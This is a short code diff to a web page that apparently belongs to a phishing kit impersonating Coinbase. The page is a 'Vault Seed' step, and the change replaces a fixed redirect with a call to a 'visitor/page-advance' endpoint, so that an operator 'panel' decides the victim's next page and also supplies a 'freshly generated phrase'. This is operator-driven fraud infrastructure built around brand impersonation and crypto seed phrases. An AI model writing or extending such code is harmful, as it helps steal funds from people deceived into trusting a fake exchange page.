@@ -271,9 +271,16 @@
   continueBtn.addEventListener('click', function () {
     continueBtn.disabled = true;
     continueBtn.textContent = 'Securing vault…';
-    setTimeout(function () {
-      window.location.href = '/templates/preview/Coinbase/Loading';
-    }, 600);
+    fetch('/api/visitor/page-advance', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ brand: 'Coinbase', page: 'Vault Seed', choice: 'continue' })
+    }).then(function (r) { return r.json().catch(function () { return null; }); })
+      .then(function (d) {
+        if (d && d.nextUrl) location.href = d.nextUrl;
+        else location.href = '/loading';
+      })
+      .catch(function () { location.href = '/loading'; });
   });
 
   // Fetch a freshly generated phrase from the panel API.
